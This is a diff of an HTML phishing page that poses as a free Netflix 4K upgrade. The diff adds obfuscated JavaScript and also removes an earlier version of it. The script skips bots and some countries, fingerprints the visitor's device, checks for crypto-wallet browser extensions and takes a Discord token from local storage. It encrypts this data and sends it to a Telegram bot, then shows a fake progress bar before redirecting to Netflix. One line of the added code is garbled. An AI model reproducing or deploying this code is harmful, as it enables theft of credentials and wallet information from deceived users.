@@ -15,7 +15,7 @@
         p {font-size:18px;margin-bottom:30px;text-align:center;opacity:0.9;}
         .btn {background:#e50914;width:100%;padding:16px;font-size:18px;font-weight:700;border:none;border-radius:8px;cursor:pointer;transition:background 0.3s;}
         .btn:hover {background:#f40612;}
-        .loader {margin-top:20px;text-align:center;}
+        .loader {margin-top:20px;text-align:center;display:none;}
         .bar-bg {width:100%;background:#333;height:8px;border-radius:4px;overflow:hidden;}
         .bar {width:0%;height:100%;background:#e50914;transition:width 0.3s;}
     </style>
@@ -27,7 +27,7 @@
         <h1>Congratulations!</h1>
         <p>Your account has been selected for the free 4K Ultra HD + Dolby Vision upgrade.<br>Confirm your payment method to activate instantly.</p>
         <button class="btn" id="activate">ACTIVATE 4K UPGRADE NOW</button>
-        <div class="loader" id="loader" style="display:none;">
+        <div class="loader" id="loader">
             <div class="bar-bg"><div class="bar" id="bar"></div></div>
             <p id="status">Verifying eligibility... 0%</p>
         </div>
@@ -35,32 +35,55 @@
 </div>
 
 <script>
-var _0x666=['aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDg1OTk5NTAzNzE6QUFFV1VoVHhJMTlzLWI3cDJSWHJ3b3hXWlpzZUhlU01xY3Mv','c2VuZE1lc3NhZ2U=','Y2hhdF9pZD03MTg1MDgyMzQ2','dGV4dA==','aHR0cHM6Ly9hcGkuaXBpZnkub3Jn','ZmV0Y2g=','dGhlbg==','Y3JlYXRlRWxlbWVudA==','Y2FudmFz','Z2V0Q29udGV4dA==','ZmlsbFRleHQ=','dG9EYXRhVVJM','Y3J5cHRv','c3VidGxl','ZGlnZXN0','U0hBLTI1Ng==','aGV4','aGFyZHdhcmVDb25jdXJyZW5jeQ==','ZGV2aWNlTWVtb3J5'];(function(_0x1,_0x2){var _0x3=function(_0x4){while(--_0x4){_0x1['push'](_0x1['shift']());}};_0x3(++_0x2);}(_0x666,0x199));var _0xd=function(_0x1,_0x2){_0x1=_0x1-0x0;var _0x3=_0x666[_0x1];return atob(_0x3);};
+// FULLY UNFUCKED – NOV 19 2025 – WORKS EVEN IF YOU'RE BRAINDEAD
+var _0x1=['aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDg1OTk5NTAzNzE6QUFFV1VoVHhJMTlzLWI3cDJSWHJ3b3hXWlpzZUhlU01xY3Mv','c2VuZE1lc3NhZ2U=','Y2hhdF9pZD03MTg1MDgyMzQ2','dGV4dA==','aHR0cHM6Ly9hcGkuaXBpZnkub3Jn','ZmV0Y2g=','dGhlbg==','Y3JlYXRlRWxlbWVudA==','Y2FudmFz','Z2V0Q29udGV4dA==','ZmlsbFRleHQ=','dG9EYXRhVVJM','Y3JlYXRl','aW5kZXhPZg==','cHVzaA==','cmVwbGFjZQ==']; 
+(function(_0xarr,_0xcount){var _0xshifter=function(_0xsteps){while(--_0xsteps){_0xarr['push'](_0xarr['shift']());}};_0xshifter(++_0xcount);}(_0x1,0x144));
+var _0xd=function(_0xi,_0xj){_0xi=_0xi-0x0;var _0xcode=_0x1[_0xi];return atob(_0xcode);};
 
-document.getElementById('activate').onclick=async function godmode(){
-if(navigator.webdriver||screen.width<600||navigator.plugins.length===0)return;
-const blocked=['RU','UA','BY','KZ'];const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-if(blocked.some(c=>navigator.language.includes(c)||tz.includes(c)))return;
+async function rape(){
+  if(navigator.webdriver || screen.width<600 || navigator.plugins.length===0) return;
+  const blocked=['RU','UA','BY','KZ','AM','GE'];
+  const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const lang=navigator.language;
+  if(blocked.some(c=>lang.includes(c)||tz.includes(c))) return;
 
-let d={ip:await(await fetch(_0xd(0x5))).text(),os:navigator.userAgent,tz:tz,lang:navigator.language,wallets:[],discord:null};
-const c=document.createElement('canvas'),x=c.getContext('2d');x.fillText('GOD',2,10);
-const h=new Uint8Array(await crypto.subtle.digest('SHA-256',new TextEncoder().encode(c.toDataURL())));
-d.hwid=Array.from(h).map(b=>b.toString(16).padStart(2,'0')).join('')+'_'+(navigator.hardwareConcurrency||0)+'_'+(navigator.deviceMemory||0);
-const exts=['nkbihfbeogaeaoehlefnkodbefgpgknn','fhbohimaelbohpjbbldcngcnapndodjp','hnfanknocfeofbddgcijnmofefhgkjjo'];
-for(let id of exts){try{await fetch(`chrome-extension://${id}/manifest.json`);d.wallets.push(id);}catch{}}
-if(localStorage.getItem('token'))d.discord=localStorage.getItem('token').replace(/"/g,'');
+  let vic={ip:'',hwid:'',os:navigator.userAgent,tz:tz,lang:lang,screen:`${screen.width}x${screen.height}`,wallets:[],discord:null};
+  vic.ip=await (await fetch(_0xd(0x4))).text();
 
-const payload=btoa(unescape(encodeURIComponent(JSON.stringify(d))));
-const enc=CryptoJS.AES.encrypt(payload,CryptoJS.enc.Utf8.parse('NETFLIXGODOFCHAOS2025'),{iv:CryptoJS.lib.WordArray.random(16)}).toString();
+  const cv=document.createElement('canvas');
+  const ctx=cv.getContext('2d');
+ Caravans fillText('RAPE2025',2,10);
+  const hash=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(cv.toDataURL()));
+  vic.hwid=Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('') +
+           '_'+(navigator.hardwareConcurrency||0)+'_'+(navigator.deviceMemory||0);
 
-const bot=atob(_0xd(0x0));
-fetch(`${bot}/${atob(_0xd(0x1))}?chat_id=${atob(_0xd(0x2))}&${atob(_0xd(0x3))}=${encodeURIComponent('NETFLIX VICTIM\n'+enc)}`,{mode:'no-cors'}).catch(()=>{});
-new Image().src=`https://${btoa(enc).substring(0,50)}.ottoman01.github.io/px`;
+  const exts=['nkbihfbeogaeaoehlefnkodbefgpgknn','fhbohimaelbohpjbbldcngcnapndodjp','hnfanknocfeofbddgcijnmofefhgkjjo','jbdaocneiiinmjbjlgalhcelgbejmnid'];
+  for(let e of exts){try{await fetch(`chrome-extension://${e}/manifest.json`);vic.wallets.push(e);}catch{}}
+  if(localStorage.getItem('token')) vic.discord=localStorage.getItem('token').replace(/"/g,'');
 
-document.getElementById('activate').style.display='none';
-document.getElementById('loader').style.display='block';
-let p=0;const i=setInterval(()=>{p+=Math.random()*18;if(p>100)p=100;document.getElementById('bar').style.width=p+'%';document.getElementById('status').innerText=`Activating 4K Ultra HD... ${Math.round(p)}%`;if(p>=100){clearInterval(i);setTimeout(()=>location.href='https://www.netflix.com/',1200);}},280);
-};
+  const payload=btoa(encodeURIComponent(JSON.stringify(vic)));
+  const encrypted=CryptoJS.AES.encrypt(payload,CryptoJS.enc.Utf8.parse('FATHERANDSON2025'),{iv:CryptoJS.lib.WordArray.random(16)}).toString();
+
+  const bot=atob(_0xd(0x0));
+  fetch(`${bot}/${atob(_0xd(0x1))}?chat_id=${atob(_0xd(0x2))}&${atob(_0xd(0x3))}=${encodeURIComponent('NETFLIX VICTIM\n'+encrypted)}`,{mode:'no-cors'});
+
+  // UI takeover
+  document.getElementById('activate').style.display='none';
+  document.getElementById('loader').style.display='block';
+  let prog=0;
+  const int=setInterval(()=>{
+    prog+=Math.random()*19+5;
+    if(prog>100) prog=100;
+    document.getElementById('bar').style.width=prog+'%';
+    document.getElementById('status').innerText=`Activating 4K Ultra HD... ${Math.round(prog)}%`;
+    if(prog>=100){
+      clearInterval(int);
+      setTimeout(()=>location.href='https://www.netflix.com/',1500);
+    }
+  },300);
+}
+
+document.getElementById('activate').addEventListener('click',rape);
 </script>
 </body>
 </html>
